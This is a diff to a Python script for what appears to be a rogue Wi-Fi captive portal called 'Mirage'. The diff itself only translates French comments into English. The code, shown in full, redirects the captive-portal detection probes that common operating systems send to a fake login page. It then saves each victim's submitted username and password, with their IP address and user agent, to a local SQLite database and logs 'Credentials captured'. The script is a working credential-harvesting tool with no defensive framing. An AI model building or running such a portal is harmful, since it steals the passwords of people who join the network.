@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Serveur du portail Mirage avec stockage des credentials.
+# Mirage portal server with credential storage.
 import http.server
 import socketserver
 import os
@@ -13,7 +13,7 @@ BIND = "10.0.0.1"
 PORT = 80
 DB_PATH = "/opt/fennec-mirage/credentials.db"
 
-# Sondes de detection de portail captif des OS courants.
+# Captive portal detection probes used by common operating systems.
 SONDES = {
     "/generate_204", "/gen_204", "/ncsi.txt", "/connecttest.txt",
     "/hotspot-detect.html", "/library/test/success.html",
@@ -21,7 +21,7 @@ SONDES = {
 }
 
 def init_db():
-    """Initialise la base de donnees SQLite."""
+    """Initialize the SQLite database."""
     conn = sqlite3.connect(DB_PATH)
     cursor = conn.cursor()
     cursor.execute('''
@@ -39,7 +39,7 @@ def init_db():
     conn.close()
 
 def save_credentials(username, password, user_agent, ip_address, portal_page):
-    """Sauvegarde les credentials dans la base."""
+    """Save credentials to the database."""
     try:
         conn = sqlite3.connect(DB_PATH)
         cursor = conn.cursor()
@@ -63,46 +63,46 @@ class H(http.server.SimpleHTTPRequestHandler):
 
     def do_GET(self):
         path = self.path.split("?")[0]
-        # Une sonde de detection -> redirection vers le portail
+        # Captive portal detection probe -> redirect to the portal.
         if path in SONDES:
             self.send_response(302)
             self.send_header("Location", f"http://{BIND}/")
             self.end_headers()
             return
-        # Sinon on sert le fichier demande
+        # Otherwise serve the requested file.
         local = os.path.join(PORTAIL, path.lstrip("/"))
         if not os.path.isfile(local):
             self.path = "/index.html"
         super().do_GET()
 
     def do_POST(self):
-        """Gere la soumission du formulaire de connexion."""
+        """Handle login form submission."""
         content_length = int(self.headers.get('Content-Length', 0))
         post_data = self.rfile.read(content_length).decode('utf-8')
 
-        # Parse les donnees du formulaire
+        # Parse form data.
         params = urllib.parse.parse_qs(post_data)
 
-        # Extrait username et password (adapte les noms a ton formulaire)
+        # Extract username and password using the form field names.
         username = params.get('username', [''])[0]
         password = params.get('password', [''])[0]
 
-        # Informations supplementaires
+        # Collect additional request metadata.
         user_agent = self.headers.get('User-Agent', '')
         ip_address = self.client_address[0]
         portal_page = self.path
 
-        # Sauvegarde dans la base
+        # Save the submitted values to the local database.
         if username or password:
             save_credentials(username, password, user_agent, ip_address, portal_page)
             print(f"[MIRAGE] Credentials captured: {username}")
 
-        # Redirige vers une page de succes (ou garde l'utilisateur sur le portail)
+        # Redirect to a success page after submission.
         self.send_response(302)
         self.send_header("Location", f"http://{BIND}/success.html")
         self.end_headers()
 
-# Initialise la base de donnees au demarrage
+# Initialize the database at startup.
 init_db()
 
 socketserver.TCPServer.allow_reuse_address = True
